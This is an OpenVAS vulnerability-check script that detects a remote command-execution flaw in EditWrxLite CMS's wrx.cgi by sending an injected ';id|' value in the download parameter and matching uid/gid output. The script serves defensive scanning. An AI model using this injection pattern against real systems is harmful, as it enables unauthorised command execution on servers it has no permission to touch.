###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_EditWrxLite_51995.nasl 9352 2018-04-06 07:13:02Z cfischer $
#
# EditWrxLite CMS 'wrx.cgi' Remote Command Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "EditWrxLite CMS is prone to a remote command-execution vulnerability.

Attackers can exploit this issue to execute arbitrary commands with
the privileges of the affected application.";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103419");
 script_bugtraq_id(51995);
 script_version ("$Revision: 9352 $");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("EditWrxLite CMS 'wrx.cgi' Remote Command Execution Vulnerability");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/51995");
 script_xref(name : "URL" , value : "http://editwrx.com/index.htm");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:13:02 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2012-02-15 10:28:37 +0100 (Wed, 15 Feb 2012)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);

foreach dir( make_list_unique( "/editwrx", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/wrx.cgi";

  if( http_vuln_check( port:port, url:url, pattern:"<title>.*EditWrx" ) ) {

    url = dir + "/wrx.cgi?download=;id|";

    if( http_vuln_check( port:port, url:url, pattern:"uid=[0-9]+.*gid=[0-9]+.*" ) ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
